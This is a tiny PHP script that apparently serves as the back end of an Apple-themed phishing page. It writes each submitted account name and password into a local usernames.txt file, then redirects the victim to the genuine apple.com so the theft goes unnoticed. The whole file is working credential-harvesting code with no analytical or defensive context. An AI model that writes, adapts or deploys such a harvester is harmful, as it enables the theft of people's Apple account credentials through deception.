<?php

file_put_contents("usernames.txt", "Account: " . $_POST['apple'] . "\nPassword: " . $_POST['pw'] . "\n", FILE_APPEND);
header('Location: https://www.apple.com');
exit();
